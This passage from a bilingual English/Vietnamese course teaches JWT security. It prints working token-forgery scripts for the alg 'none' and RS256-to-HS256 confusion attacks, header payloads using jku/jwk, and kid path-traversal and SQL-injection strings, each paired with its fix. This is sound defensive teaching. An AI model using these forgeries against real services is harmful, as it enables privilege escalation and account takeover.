<a class="link-card" href="https://portswigger.net/web-security/jwt/algorithm-confusion" target="_blank" rel="noopener"><span class="lc-ico">🔬</span><span class="lc-body"><span class="lc-title">PortSwigger — algorithm confusion</span><span class="lc-sub">portswigger.net · A working lab for attack 2, including deriving the public key from tokens</span></span></a>
<a class="link-card" href="https://github.com/panva/jose" target="_blank" rel="noopener"><span class="lc-ico">📦</span><span class="lc-body"><span class="lc-title">jose</span><span class="lc-sub">github.com · The library where keys carry their algorithm, so confusion is unrepresentable</span></span></a>
<a class="link-card" href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/" target="_blank" rel="noopener"><span class="lc-ico">📰</span><span class="lc-body"><span class="lc-title">The original write-up</span><span class="lc-sub">auth0.com · The 2015 disclosure of both attacks, with the affected libraries</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Forge an admin token four different ways, then close all four with one line</span></span></a>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.2</span>
<h2>Cái token TỰ NÓI cho máy chủ cách kiểm nó</h2>
<p class="lead">Header của JWT chứa <code>alg</code>, và <code>alg</code> nằm bên trong cái phần mà KẺ TẤN CÔNG kiểm soát hoàn toàn. Một bộ xác minh đọc nó rồi làm theo là đang tin cho một THÔNG ĐIỆP tự mô tả mức bảo mật của chính nó — đó là hình dạng của MỌI cú tấn công trong bài này, và là lý do một dòng cấu hình vá được tất cả.</p>

<h3>Cú 1 — <code>alg: "none"</code></h3>
<pre><code><span class="tok-comment"># Lấy một token thật, đổi hai thứ, bỏ chữ ký đi</span>
node -e '
const b = (o) =&gt; Buffer.from(JSON.stringify(o)).toString("base64url");
const h = b({ alg: "none", typ: "JWT" });
const p = b({ sub: "clx7", role: "ADMIN", exp: 9999999999 });
console.log(h + "." + p + ".");            <span class="tok-comment">// ← chữ ký RỖNG</span>
'</code></pre>
<div class="out">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJjbHg3IiwidmFpVHJvIjoiQURNSU4iLCJleHAiOjk5OTk5OTk5OTl9.

$ curl -s localhost:3000/toi -H "Authorization: Bearer &lt;token tren&gt;"
{"id":"clx7","role":"ADMIN"}      ← neu thu vien chap nhan "none"</div>
<div class="kv-grid">
  <div class="kv"><span class="k">Nó NẰM TRONG đặc tả</span><span class="v">RFC 7519 định nghĩa <code>none</code> là "Unsecured JWS", dành cho trường hợp tính toàn vẹn đã được một tầng khác bảo đảm. Đó là một chế độ chính đáng với mục đích chính đáng, và nó KHÔNG BAO GIỜ được với tới bởi một token đến từ mạng.</span></div>
  <div class="kv"><span class="k">Các thư viện ĐÃ từng ship mở cửa này</span><span class="v">Nhiều bản cài đặt lớn từng mặc định chấp nhận <code>none</code>, và lớp lỗ hổng này đủ cũ để có một danh sách CVE của riêng nó. Các bản hiện hành từ chối nó, và đó KHÔNG phải lý do để bỏ qua danh sách trắng.</span></div>
  <div class="kv"><span class="k">Trò chữ hoa chữ thường</span><span class="v"><code>None</code>, <code>NONE</code> và <code>nOnE</code> đều đã từng vượt qua những bộ lọc so chuỗi với <code>"none"</code>. Đó là lý do lớp phòng phải là một <em>DANH SÁCH TRẮNG</em> những gì bạn CHẤP NHẬN, không bao giờ là danh sách đen những gì bạn từ chối.</span></div>
  <div class="kv"><span class="k">Chữ ký RỖNG là dấu hiệu</span><span class="v">Một token kết thúc bằng dấu chấm mà phía sau không có gì là một token KHÔNG KÝ. Đáng đặt một luật trong nhật ký: nếu có bất kỳ token nào tới production mà đoạn thứ ba rỗng thì có gì đó sai và bạn muốn biết NGAY.</span></div>
</div>

<h3>Cú 2 — RS256 bị làm cho lẫn thành HS256</h3>
<div class="lz-map">
  <div class="lz-stage">
    <span class="lz-badge">Ý định</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">RS256</span><span class="lz-nsub">Khoá riêng ký · khoá công xác minh · khoá công thì CÔNG KHAI</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Kẻ tấn công</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Đổi alg thành HS256</span><span class="lz-nsub">Rồi HMAC bằng chính KHOÁ CÔNG làm bí mật</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Bên xác minh</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">"alg là HS256, khoá là cái PEM này"</span><span class="lz-nsub">Cùng những byte đó ở cả hai phía → chữ ký khớp</span></div></div>
  </div>
</div>
<pre><code><span class="tok-comment">// ❌ Mã có lỗ hổng — trông hoàn toàn hợp lý</span>
const publicKey = fs.readFileSync('public.pem', 'utf8');
const claims = jwt.verify(token, publicKey);        <span class="tok-comment">// alg lấy từ TOKEN</span></code></pre>
<pre><code><span class="tok-comment"># Kẻ tấn công tự đúc một cái, dùng đúng file PEM CÔNG KHAI làm bí mật HMAC</span>
node -e '
const c = require("crypto"), fs = require("fs");
const pem = fs.readFileSync("public.pem", "utf8");   <span class="tok-comment">// ai cũng tải được</span>
const b = (o) =&gt; Buffer.from(JSON.stringify(o)).toString("base64url");
const h = b({ alg: "HS256", typ: "JWT" });
const p = b({ sub: "clx7", role: "ADMIN", exp: 9999999999 });
const s = c.createHmac("sha256", pem).update(h + "." + p).digest("base64url");
console.log(h + "." + p + "." + s);
'</code></pre>
<div class="out">$ curl -s localhost:3000/toi -H "Authorization: Bearer &lt;token gia mao&gt;"
{"id":"clx7","role":"ADMIN"}

# May chu doc alg=HS256, lay "khoa" no dang cam — chuoi PEM cong khai —
# roi tinh HMAC. Ke tan cong cung dung DUNG chuoi do. Hai ben khop.
# Ca he thong bat doi xung vua bi bien thanh doi xung, bang MOT truong.</div>
<div class="callout warn">
<p><strong>Đây là cú kinh điển, và nó chạy được CHÍNH VÌ khoá công thật sự là công khai.</strong> Một khoá công RSA được công bố một cách CÓ CHỦ Ý — trong một endpoint JWKS, trong một chứng chỉ, trong một kho mã. Cú tấn công không cần một bí mật nào cả: nó cần bên xác minh CHẤP NHẬN một thuật toán mà bên phát hành không bao giờ dùng. Ghim cứng thuật toán là xoá sạch nó, và không có cách nào khác làm được điều đó.</p>
</div>

<h3>Cú 3 và 4 — cái header TRỎ đi đâu đó</h3>
<pre><code><span class="tok-comment">// jku: "đây là URL chứa khoá công của tôi, tải về mà kiểm"</span>
{ "alg": "RS256", "jku": "https://ke-tan-cong.com/keys.json", "kid": "1" }

<span class="tok-comment">// jwk: "khỏi tải, khoá công NẰM NGAY ĐÂY"</span>
{ "alg": "RS256", "jwk": { "kty": "RSA", "n": "…", "e": "AQAB" } }</code></pre>
<div class="out"># Neu bo xac minh TIN theo jku hay jwk, ke tan cong tu sinh mot cap khoa,
# ky token bang khoa rieng cua HO, va tro cho ban toi khoa cong cua HO.
# Chu ky hop le. Nguoi ky la ke tan cong.</div>
<pre><code><span class="tok-comment">// kid được dùng để TRA khoá — nên nó là một tham số truy vấn nữa</span>
{ "alg": "HS256", "kid": "../../../../dev/null" }        <span class="tok-comment">// đọc file</span>
{ "alg": "HS256", "kid": "1' UNION SELECT 'abc' -- " }   <span class="tok-comment">// SQL injection</span></code></pre>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">LỜ HẲN <code>jku</code>, <code>jwk</code> và <code>x5u</code></span><span class="lz-lnote">KHÔNG có tình huống nào mà một token bạn NHẬN ĐƯỢC lại được quyền nói cho bạn biết phải đi lấy khoá xác minh ở đâu. Hãy TỰ cấu hình nguồn khoá. Một thư viện mặc định đi theo những header này thì phải cấu hình cho nó thôi, hoặc thay nó đi.</span></div>
  <div class="lz-layer"><span class="lz-lname"><code>kid</code> là ĐẦU VÀO của kẻ tấn công</span><span class="lz-lnote">Hãy tra nó trong một bản đồ cố định hoặc một JWKS đã tải về, khớp chuỗi CHÍNH XÁC. ĐỪNG BAO GIỜ nối nó vào một đường dẫn file hay một câu SQL. <code>kid: "../../dev/null"</code> với một kho khoá dạng file sẽ cho ra một khoá RỖNG — và HMAC với khoá rỗng là một chữ ký mà kẻ tấn công tự tính được.</span></div>
  <div class="lz-layer"><span class="lz-lname">Một bí mật HMAC YẾU bị bẻ NGOẠI TUYẾN</span><span class="lz-lnote">Đưa cho hashcat một token HS256 và một wordlist, nó khôi phục một bí mật kiểu từ điển trong vài giây — không hề tương tác với máy chủ của bạn. Một bí mật ký JWT phải là 256 bit ngẫu nhiên từ một nguồn mật mã (Bài 1.2), không phải chữ <code>secret</code>, không phải tên dự án.</span></div>
  <div class="lz-layer"><span class="lz-lname"><code>decode</code> KHÔNG phải <code>verify</code></span><span class="lz-lnote"><code>jwt.decode(token)</code> phân tích mà KHÔNG kiểm gì cả. Nó tồn tại cho công cụ phụ trợ, và mỗi lần dùng nó trong đường xử lý request là một quyết định TIN vào đầu vào chưa xác minh. Hãy tìm nó trong kho mã của bạn; kết quả thường gây bất ngờ.</span></div>
</div>

<h3>Cách vá, gói trong một dòng</h3>
<pre><code><span class="tok-comment">// ✅ Nói TRƯỚC cái gì được chấp nhận. Token không được chọn.</span>
const claims = jwt.verify(token, publicKey, {
  algorithms: ['RS256'],                     <span class="tok-comment">// ← danh sách trắng, cố định</span>
  issuer:   'https://vidu.com',
  audience: 'vidu-api',
});</code></pre>
<pre><code><span class="tok-comment">// ✅ Tốt hơn nữa: jose, nơi KHOÁ tự mang theo thuật toán của nó</span>
import { jwtVerify, importSPKI } from 'jose';

const key = await importSPKI(PEM_CONG, 'RS256');      <span class="tok-comment">// khoá BIẾT nó là RS256</span>

const { payload } = await jwtVerify(token, key, {
  algorithms: ['RS256'],
  issuer:   'https://vidu.com',
  audience: 'vidu-api',
  clockTolerance: 5,
});</code></pre>
<div class="out">$ node kiem.js "&lt;token alg=none&gt;"
JWSInvalid: "alg" (Algorithm) Header Parameter value not allowed

$ node kiem.js "&lt;token HS256 ky bang public.pem&gt;"
JWSInvalid: "alg" (Algorithm) Header Parameter value not allowed

# Ca hai cu tan cong deu chet o CUNG mot dong, truoc khi cham toi khoa.</div>
<div class="pitfall">
<p><strong>Bẫy — một danh sách trắng có HAI mục thì vẫn bị làm cho lẫn được.</strong> <code>algorithms: ['RS256', 'HS256']</code> mở lại y nguyên cú số 2, vì kẻ tấn công chỉ việc chọn cái nào hợp với họ. Nếu bạn đang chuyển đổi giữa các thuật toán, hãy phân biệt các khoá bằng <code>kid</code> rồi suy ra thuật toán mong đợi từ <em>CÁI KHOÁ BẠN ĐÃ CHỌN</em>, không bao giờ từ cái token. Một thuật toán cho mỗi khoá, do BẠN quyết.</p>
</div>
<div class="note-ct">
<p><strong>Bốn dòng soát cho bất kỳ kho mã nào có dùng JWT.</strong> Grep <code>verify(</code> và xác nhận MỌI lời gọi đều truyền một mảng <code>algorithms</code> tường minh với ĐÚNG MỘT mục · grep <code>decode(</code> và xác nhận không kết quả nào nằm trong đường xử lý request · kiểm rằng cái bí mật HMAC, nếu có, là 32 byte ngẫu nhiên chứ không phải một từ · và xác nhận thư viện KHÔNG được cấu hình để đi theo <code>jku</code> hay <code>jwk</code>. Bốn lệnh grep, và chúng phủ mọi cú tấn công trong trang này.</p>
</div>

<h3>Nguồn học cho bài này</h3>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc8725#section-3" target="_blank" rel="noopener"><span class="lc-ico">⚠️</span><span class="lc-body"><span class="lc-title">RFC 8725 §3 — thực hành tốt nhất cho JWT</span><span class="lc-sub">datatracker.ietf.org · "Dùng thuật toán phù hợp" và "kiểm mọi claim", theo chuẩn</span></span></a>
<a class="link-card" href="https://portswigger.net/web-security/jwt/algorithm-confusion" target="_blank" rel="noopener"><span class="lc-ico">🔬</span><span class="lc-body"><span class="lc-title">PortSwigger — nhầm lẫn thuật toán</span><span class="lc-sub">portswigger.net · Một bài lab chạy được cho cú số 2, kể cả cách suy ra khoá công từ token</span></span></a>
<a class="link-card" href="https://github.com/panva/jose" target="_blank" rel="noopener"><span class="lc-ico">📦</span><span class="lc-body"><span class="lc-title">jose</span><span class="lc-sub">github.com · Thư viện mà KHOÁ tự mang thuật toán, nên sự nhầm lẫn không diễn đạt nổi</span></span></a>
<a class="link-card" href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/" target="_blank" rel="noopener"><span class="lc-ico">📰</span><span class="lc-body"><span class="lc-title">Bài công bố gốc</span><span class="lc-sub">auth0.com · Công bố năm 2015 cho cả hai cú, kèm danh sách thư viện bị ảnh hưởng</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Giả mạo một token admin theo bốn cách khác nhau, rồi bịt cả bốn bằng một dòng</span></span></a>
</div>
`,
    },
    /* ─────────────────────────── 4.3 ─────────────────────────── */
    {
      title: '4.3 — Seven claims, and the attack for each one you skip|||4.3 — Bảy claim, và cú tấn công cho mỗi cái bạn bỏ qua',
      slug: 'auth-4-3-cac-claim',
      type: 'LESSON',
      description: 'iss, sub, aud, exp, nbf, iat, jti — mỗi claim tồn tại vì một cú tấn công cụ thể, và bỏ kiểm cái nào là mở lại cú đó. Kèm cái bẫy giây-đối-lại-mili-giây tạo ra token sống tới năm 57000, dung sai đồng hồ nên đặt bao nhiêu, và cách đặt tên cho claim riêng.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.3</span>
<h2>Seven claims, and the attack for each one you skip</h2>
<p class="lead">A valid signature answers exactly one question: was this issued by someone holding the key. Whether the token is still valid, was meant for you, came from who you think, and has not been replayed are four more questions, and each has a claim that answers it. Skipping any of them reopens a specific attack.</p>

<h3>The seven, and what each defends</h3>
<div class="kv-grid">
  <div class="kv"><span class="k"><code>exp</code> — expiry</span><span class="v">Seconds since epoch after which the token must be rejected. Without it, a token leaked into a log in 2024 still works today. This is the only bound on a stolen bearer credential — Lesson 1.1.</span></div>
  <div class="kv"><span class="k"><code>aud</code> — audience</span><span class="v">Who the token was minted for. Without it, a token your users obtain for the public API can be replayed against the internal admin API, if both trust the same issuer. This is the confused deputy, in one field.</span></div>
  <div class="kv"><span class="k"><code>iss</code> — issuer</span><span class="v">Who signed it. Without it, any issuer whose key you accept — a second identity provider, a legacy system, a test tenant — can mint tokens your service honours.</span></div>
  <div class="kv"><span class="k"><code>sub</code> — subject</span><span class="v">Who the token is about. Use a stable internal id, never an email: emails change, get reassigned, and differ in case. A <code>sub</code> that can be reused is an account takeover waiting for a support ticket.</span></div>
  <div class="kv"><span class="k"><code>iat</code> — issued at</span><span class="v">When it was minted. Drives step-up authentication (Lesson 3.3's <code>max_age</code>) and lets you reject every token issued before a password change — the poor man's revocation.</span></div>
  <div class="kv"><span class="k"><code>nbf</code> — not before</span><span class="v">Rarely needed: a token that becomes valid later. Worth checking anyway, because a library that ignores it will happily accept a token forward-dated by an issuer you do not fully trust.</span></div>
  <div class="kv"><span class="k"><code>jti</code> — token id</span><span class="v">A unique id per token. Required if you ever need to deny one specific token, and required for one-time-use tokens — a password reset link that must not work twice (Chapter 6).</span></div>
  <div class="kv"><span class="k">Custom claims — namespace them</span><span class="v">Use <code>https://vidu.com/role</code> rather than <code>role</code>. Unnamespaced names can collide with a future registered claim or with another issuer's meaning, and OIDC providers require the URI form for anything they pass through.</span></div>
</div>

<h3>The seconds trap</h3>
<pre><code><span class="tok-comment">// ❌ One line, and the token lives until the year 57000</span>
const claims = { sub: u.id, exp: Date.now() + 15 * 60 * 1000 };</code></pre>
<div class="out">$ node -e "console.log(new Date((Date.now() + 900000)     * 1000))"
+057219-11-08T13:20:00.000Z          ← exp doc theo GIAY

$ node -e "console.log(new Date( Math.floor(Date.now()/1000) + 900 ))"
1970-01-01T00:29:16.000Z             ← con so DUNG, in ra sai vi Date() nhan ms

# JWT do exp bang GIAY. Date.now() tra ve MILI GIAY.
# Nham lan nay khong bao gio bao loi — no chi lam token khong bao gio het han.</div>
<pre><code><span class="tok-comment">// ✅ Let the library do the arithmetic; never hand-roll time maths</span>
import { SignJWT } from 'jose';

const token = await new SignJWT({ 'https://vidu.com/role': u.role })
  .setProtectedHeader({ alg: 'RS256', kid: KID_HIEN_TAI })
  .setIssuer('https://vidu.com')
  .setAudience('vidu-api')
  .setSubject(u.id)
  .setIssuedAt()
  .setExpirationTime('15m')             <span class="tok-comment">// ← a string, not arithmetic</span>
  .setJti(randomUUID())
  .sign(privateKey);</code></pre>
<div class="callout warn">
<p><strong>This is the most common JWT bug in JavaScript codebases, and it is silent.</strong> Nothing throws, nothing warns, and every test passes — because a token that never expires works perfectly in every test you would think to write. It surfaces only when someone finds a year-old token still working, which is usually during an incident. Never compute <code>exp</code> by hand; let the library take a duration string.</p>
</div>

<h3>Validating all of them</h3>
<pre><code>import { jwtVerify } from 'jose';

export async function checkToken(token: string) {
  const { payload } = await jwtVerify(token, publicKey, {
    algorithms: ['RS256'],            <span class="tok-comment">// Lesson 4.2 — mandatory</span>
    issuer:     'https://vidu.com',   <span class="tok-comment">// iss</span>
    audience:   'vidu-api',           <span class="tok-comment">// aud</span>
    clockTolerance: 5,                <span class="tok-comment">// seconds, NOT minutes</span>
    maxTokenAge: '15m',               <span class="tok-comment">// caps iat as well as exp</span>
  });
  <span class="tok-comment">// jose checks exp and nbf itself; the three lines above are what it CANNOT guess.</span>

  if (!payload.sub) throw new Error('thieu sub');
  return payload;
}</code></pre>
<div class="out">$ node kiem.js "&lt;token het han&gt;"
JWTExpired: "exp" claim timestamp check failed

$ node kiem.js "&lt;token cho vidu-admin, gui toi vidu-api&gt;"
JWTClaimValidationFailed: unexpected "aud" claim value

$ node kiem.js "&lt;token tu mot issuer khac&gt;"
JWTClaimValidationFailed: unexpected "iss" claim value</div>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-k">Every service names its own <code>aud</code></span><span class="lz-t">The rule that prevents replay</span><span class="lz-d">The public API accepts only <code>vidu-api</code>; the admin API accepts only <code>vidu-admin</code>. A token for one is rejected by the other even though both trust the same issuer and the same key. Without this, one <code>aud</code> value fits all and the separation is imaginary.</span></div>
  <div class="lz-step"><span class="lz-k">Clock tolerance in seconds</span><span class="lz-t">Five, not five hundred</span><span class="lz-d">Servers drift by milliseconds when NTP works and by minutes when it does not. Five seconds absorbs normal skew; a five-minute tolerance means every expired token stays usable for five extra minutes, which is a meaningful extension on a fifteen-minute token.</span></div>
  <div class="lz-step"><span class="lz-k">If clocks are wrong, fix the clocks</span><span class="lz-t">Not the tolerance</span><span class="lz-d">A large tolerance is a workaround for an infrastructure problem, and it weakens every token. <code>timedatectl status</code> and a working NTP client are the actual fix, and they fix other things too.</span></div>
  <div class="lz-step"><span class="lz-k">Reject, do not repair</span><span class="lz-t">On any failed claim</span><span class="lz-d">A missing <code>aud</code>, an unparseable <code>exp</code>, an unknown <code>iss</code> — all are 401, all identical to the caller. Never fall back to "well, the signature was valid"; that is exactly the reasoning this lesson exists to prevent.</span></div>
</div>

<h3><code>jti</code>, and revocation you can actually afford</h3>
<pre><code><span class="tok-comment">// A small DENY list, kept only for the token's remaining lifetime</span>
export async function blockToken(jti: string, expSeconds: number) {
  const remaining = expSeconds - Math.floor(Date.now() / 1000);
  if (remaining &gt; 0) await redis.set(&#96;chan:\${jti}&#96;, '1', { EX: remaining });
}

export async function blocked(jti: string) {
  return (await redis.exists(&#96;chan:\${jti}&#96;)) === 1;
}</code></pre>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">The denylist stays small by construction</span><span class="lz-lnote">An entry lives only until the token would have expired anyway. With fifteen-minute tokens, the list holds fifteen minutes of revocations — thousands of entries at most, not millions. That is what makes this affordable where a full session store was "too much".</span></div>
  <div class="lz-layer"><span class="lz-lname">It reintroduces a lookup</span><span class="lz-lnote">Be honest about this: you now check a store on every request, which is the cost you avoided by not using sessions. The difference is that Redis is optional here — a token still expires on its own if the denylist is unreachable, so you can fail open on a cache outage.</span></div>
  <div class="lz-layer"><span class="lz-lname">The cheaper alternative: a version number</span><span class="lz-lnote">Keep <code>phienBanToken</code> on the user row, put it in the token, and compare on verify. Bumping it invalidates every token for that user at once — logout everywhere, password change, role removal. It costs a user lookup rather than a per-token entry, and it cannot revoke one single token.</span></div>
  <div class="lz-layer"><span class="lz-lname">Cheapest of all: <code>iat</code> versus a timestamp</span><span class="lz-lnote">Store <code>tokenHopLeTu</code> on the user; reject any token whose <code>iat</code> is earlier. Same effect as the version number with no extra column semantics — and it is exactly what "sign out of all devices" needs, at the price of one already-loaded field.</span></div>
</div>
<div class="pitfall">
<p><strong>Trap — as soon as you need <code>jti</code> revocation, re-read Lesson 3.5.</strong> A denylist is a session store: it is a lookup on every request against mutable server state. If you arrived at JWTs to avoid exactly that, and you have now added it back, the stateless benefit is gone and only the drawbacks remain — the size, the staleness, the seconds trap. The design that keeps the benefit is short-lived tokens plus a <em>stateful refresh</em> path, which is Chapter 5, not a denylist bolted onto long-lived tokens.</p>
</div>
<div class="note-ct">
<p><strong>The five-line audit.</strong> Every <code>verify</code> call names <code>algorithms</code>, <code>issuer</code> and <code>audience</code> explicitly · <code>exp</code> is produced by a duration string, never by arithmetic on <code>Date.now()</code> · <code>clockTolerance</code> is single-digit seconds · <code>sub</code> is an internal id, not an email · and any custom claim is namespaced with a URI. Everything on this page reduces to those five lines, and each one has a concrete attack behind it.</p>
</div>

<h3>Learning sources for this lesson</h3>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc7519#section-4.1" target="_blank" rel="noopener"><span class="lc-ico">📋</span><span class="lc-body"><span class="lc-title">RFC 7519 §4.1 — registered claims</span><span class="lc-sub">datatracker.ietf.org · The seven, with their exact semantics and types</span></span></a>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc8725#section-3.8" target="_blank" rel="noopener"><span class="lc-ico">🎯</span><span class="lc-body"><span class="lc-title">RFC 8725 §3.8 — validate the audience</span><span class="lc-sub">datatracker.ietf.org · Why cross-service replay is the default without it</span></span></a>
<a class="link-card" href="https://github.com/panva/jose/blob/main/docs/jwt/verify/functions/jwtVerify.md" target="_blank" rel="noopener"><span class="lc-ico">✅</span><span class="lc-body"><span class="lc-title">jose — jwtVerify options</span><span class="lc-sub">github.com · Every option, including maxTokenAge and clockTolerance</span></span></a>
<a class="link-card" href="https://www.iana.org/assignments/jwt/jwt.xhtml" target="_blank" rel="noopener"><span class="lc-ico">📇</span><span class="lc-body"><span class="lc-title">IANA — JWT claims registry</span><span class="lc-sub">iana.org · Every registered name, so your custom claim does not collide with one</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Replay a token across two services, then add one claim check and watch it stop</span></span></a>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.3</span>
<h2>Bảy claim, và cú tấn công cho mỗi cái bạn bỏ qua</h2>
<p class="lead">Một chữ ký hợp lệ trả lời ĐÚNG MỘT câu hỏi: cái này có do ai đó cầm khoá phát ra không. Còn token CÒN hiệu lực không, có DÀNH CHO bạn không, có tới TỪ nơi bạn nghĩ không, và có bị PHÁT LẠI không thì là bốn câu hỏi nữa, và mỗi câu có một claim trả lời. Bỏ kiểm cái nào là mở lại một cú tấn công cụ thể.</p>

<h3>Bảy cái, và mỗi cái phòng điều gì</h3>
<div class="kv-grid">
  <div class="kv"><span class="k"><code>exp</code> — hết hạn</span><span class="v">Số GIÂY tính từ mốc epoch, sau thời điểm đó token PHẢI bị từ chối. Không có nó, một token rò vào log năm 2024 vẫn chạy hôm nay. Đây là ràng buộc DUY NHẤT lên một tín vật mang theo bị cắp — Bài 1.1.</span></div>
  <div class="kv"><span class="k"><code>aud</code> — đối tượng nhận</span><span class="v">Token được đúc ra CHO AI. Không có nó, một token mà người dùng lấy được cho API công khai có thể phát lại vào API quản trị nội bộ, nếu cả hai cùng tin một bên phát hành. Đây chính là "phó quan bị lẫn", gói trong một trường.</span></div>
  <div class="kv"><span class="k"><code>iss</code> — bên phát hành</span><span class="v">AI đã ký nó. Không có nó, bất kỳ bên phát hành nào mà bạn chấp nhận khoá — một nhà cung cấp danh tính thứ hai, một hệ thống cũ, một tenant thử nghiệm — đều đúc được token mà dịch vụ của bạn tôn trọng.</span></div>
  <div class="kv"><span class="k"><code>sub</code> — chủ thể</span><span class="v">Token nói VỀ AI. Hãy dùng một id nội bộ ỔN ĐỊNH, đừng bao giờ dùng email: email thì đổi, bị cấp lại cho người khác, và khác nhau ở chữ hoa chữ thường. Một <code>sub</code> có thể bị TÁI SỬ DỤNG là một cú chiếm tài khoản đang chờ một phiếu hỗ trợ.</span></div>
  <div class="kv"><span class="k"><code>iat</code> — phát lúc</span><span class="v">Lúc nó được đúc. Nó nuôi việc xác thực theo bậc (cái <code>max_age</code> của Bài 3.3) và cho phép bạn từ chối MỌI token phát trước một lần đổi mật khẩu — cơ chế thu hồi của nhà nghèo.</span></div>
  <div class="kv"><span class="k"><code>nbf</code> — chưa hiệu lực trước</span><span class="v">Ít khi cần: một token chỉ có hiệu lực từ sau này. Vẫn đáng kiểm, vì một thư viện lờ nó đi sẽ vui vẻ nhận một token được đề ngày TƯƠNG LAI bởi một bên phát hành mà bạn không hoàn toàn tin.</span></div>
  <div class="kv"><span class="k"><code>jti</code> — mã token</span><span class="v">Một mã duy nhất cho mỗi token. Bắt buộc phải có nếu bạn từng cần CHẶN đúng một token cụ thể, và bắt buộc với token dùng-một-lần — một liên kết đặt lại mật khẩu KHÔNG được chạy hai lần (Chương 6).</span></div>
  <div class="kv"><span class="k">Claim riêng — hãy đặt trong không gian tên</span><span class="v">Dùng <code>https://vidu.com/role</code> thay vì <code>role</code>. Những cái tên trần có thể đụng với một claim được đăng ký trong tương lai hoặc với ý nghĩa của một bên phát hành khác, và các nhà cung cấp OIDC ĐÒI dạng URI với bất cứ thứ gì họ truyền qua.</span></div>
</div>

<h3>Cái bẫy GIÂY</h3>
<pre><code><span class="tok-comment">// ❌ Một dòng, và cái token sống tới năm 57000</span>
const claims = { sub: u.id, exp: Date.now() + 15 * 60 * 1000 };</code></pre>
<div class="out">$ node -e "console.log(new Date((Date.now() + 900000)     * 1000))"
+057219-11-08T13:20:00.000Z          ← exp doc theo GIAY

$ node -e "console.log(new Date( Math.floor(Date.now()/1000) + 900 ))"
1970-01-01T00:29:16.000Z             ← con so DUNG, in ra sai vi Date() nhan ms

# JWT do exp bang GIAY. Date.now() tra ve MILI GIAY.
# Nham lan nay khong bao gio bao loi — no chi lam token khong bao gio het han.</div>
<pre><code><span class="tok-comment">// ✅ Để thư viện tính giùm, và đừng bao giờ tự viết số học thời gian</span>
import { SignJWT } from 'jose';

const token = await new SignJWT({ 'https://vidu.com/role': u.role })
  .setProtectedHeader({ alg: 'RS256', kid: KID_HIEN_TAI })
  .setIssuer('https://vidu.com')
  .setAudience('vidu-api')
  .setSubject(u.id)
  .setIssuedAt()
  .setExpirationTime('15m')             <span class="tok-comment">// ← chuỗi, không phải số học</span>
  .setJti(randomUUID())
  .sign(privateKey);</code></pre>
<div class="callout warn">
<p><strong>Đây là con bug JWT PHỔ BIẾN NHẤT trong các kho mã JavaScript, và nó LẶNG LẼ.</strong> Không có gì ném lỗi, không có gì cảnh báo, và mọi bài test đều xanh — bởi vì một token KHÔNG BAO GIỜ hết hạn thì chạy hoàn hảo trong mọi bài test mà bạn nghĩ ra để viết. Nó chỉ lộ ra khi có người phát hiện một token một-năm-tuổi vẫn còn dùng được, và thường là giữa lúc đang có sự cố. ĐỪNG BAO GIỜ tự tính <code>exp</code>; hãy để thư viện nhận một chuỗi thời lượng.</p>
</div>

<h3>Kiểm HẾT chúng</h3>
<pre><code>import { jwtVerify } from 'jose';

export async function checkToken(token: string) {
  const { payload } = await jwtVerify(token, publicKey, {
    algorithms: ['RS256'],            <span class="tok-comment">// Bài 4.2 — bắt buộc</span>
    issuer:     'https://vidu.com',   <span class="tok-comment">// iss</span>
    audience:   'vidu-api',           <span class="tok-comment">// aud</span>
    clockTolerance: 5,                <span class="tok-comment">// giây, KHÔNG phải phút</span>
    maxTokenAge: '15m',               <span class="tok-comment">// chốt trần iat, ngoài exp</span>
  });
  <span class="tok-comment">// jose tự kiểm exp và nbf; ba dòng trên là những cái nó KHÔNG tự đoán được.</span>

  if (!payload.sub) throw new Error('thieu sub');
  return payload;
}</code></pre>
<div class="out">$ node kiem.js "&lt;token het han&gt;"
JWTExpired: "exp" claim timestamp check failed

$ node kiem.js "&lt;token cho vidu-admin, gui toi vidu-api&gt;"
JWTClaimValidationFailed: unexpected "aud" claim value

$ node kiem.js "&lt;token tu mot issuer khac&gt;"
JWTClaimValidationFailed: unexpected "iss" claim value</div>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-k">MỖI dịch vụ tự đặt <code>aud</code> của mình</span><span class="lz-t">Luật ngăn phát lại</span><span class="lz-d">API công khai chỉ nhận <code>vidu-api</code>; API quản trị chỉ nhận <code>vidu-admin</code>. Một token cho bên này bị bên kia TỪ CHỐI dù cả hai cùng tin một bên phát hành và một cái khoá. Không có điều này thì một giá trị <code>aud</code> vừa cho tất cả và sự tách bạch chỉ là tưởng tượng.</span></div>
  <div class="lz-step"><span class="lz-k">Dung sai đồng hồ tính bằng GIÂY</span><span class="lz-t">Năm, không phải năm trăm</span><span class="lz-d">Máy chủ lệch nhau vài mili giây khi NTP chạy và lệch vài phút khi nó không chạy. Năm giây hấp thụ được độ lệch bình thường; một dung sai năm phút nghĩa là MỌI token đã hết hạn vẫn dùng được thêm năm phút, và đó là một sự gia hạn đáng kể với một token mười lăm phút.</span></div>
